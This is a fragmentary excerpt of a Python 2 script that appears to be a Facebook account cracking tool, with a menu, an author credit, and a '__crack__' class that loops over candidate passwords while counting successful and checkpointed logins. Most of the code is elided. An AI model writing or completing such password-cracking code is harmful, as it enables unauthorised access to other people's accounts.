...
def moch_yayan():
    ...
    print '%s╠══[6]%s Cek informasi akun fb'%(O,N);time.sleep(0.04)
...
def info_tools():
    ...
    print '%s[%s>%s] • Moch Yayan Juan Alvredo XD'%(N,H,N);time.sleep(0.09)
...
class __crack__:
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s[%sCracking][%s/%s][OK:%s%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
